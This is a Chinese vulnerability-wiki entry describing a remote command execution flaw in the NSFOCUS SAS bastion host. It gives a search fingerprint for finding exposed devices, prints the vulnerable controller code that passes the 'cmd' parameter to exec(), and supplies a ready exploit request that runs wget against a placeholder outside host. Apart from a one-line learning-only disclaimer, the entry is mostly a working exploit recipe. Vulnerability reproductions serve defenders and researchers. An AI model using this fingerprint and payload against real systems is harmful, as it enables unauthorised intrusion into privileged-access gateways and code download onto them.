---
title: "绿盟 SAS堡垒机 Exec 远程命令执行漏洞"
date: 2026-10-18 09:16:34
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "绿盟"
tags:
  - "绿盟"
  - "命令执行"
  - "漏洞复现"
---
## 漏洞描述

绿盟 SAS堡垒机 Exec 远程命令执行漏洞

## 漏洞影响

绿盟 SAS堡垒机

## 网络测绘

```
body="'/needUsbkey.php?username='"
```

## 漏洞复现

登陆页面

![image-20230828162656143](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162656143.png)

漏洞存在于文件 ExecController.php 文件中

![image-20230828162917436](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162917436.png)

<details>
<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>

<pre><code class="language-text">&lt;?php
  require_once 'Nsc/Websvc/Response.php';
class ExecController extends Cavy_Controller_Action {

  var $models = 'no';

  public function index() {
    $command = $this-&gt;_params['cmd'];
    $ret = 0;
    $output = array();
    &#101;xec($command,$output,$ret);
    $result = new StdClass;
    if ($ret != 0) {
      $result-&gt;code = Nsc_Websvc_Response::EXEC_ERROR;
      $result-&gt;text = "exec error";
    }
    else {
      $result-&gt;code = Nsc_Websvc_Response::SUCCESS;
      //			$result-&gt;text = implode("\n",$output);
      $result-&gt;text = "WEBSVC OK";
    }
    $this-&gt;_render(array('result'=&gt;$result),'/websvc/result');
  }
}
?&gt;</code></pre>

</details>

验证POC

```
/webconf/Exec/index?cmd=wget%20xxx.xxx.xxx
```

![image-20230828162933312](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162933312.png)

![image-20230828162948491](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828162948491.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E7%BB%BF%E7%9B%9F-SAS%E5%A0%A1%E5%9E%92%E6%9C%BA-Exec-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md)
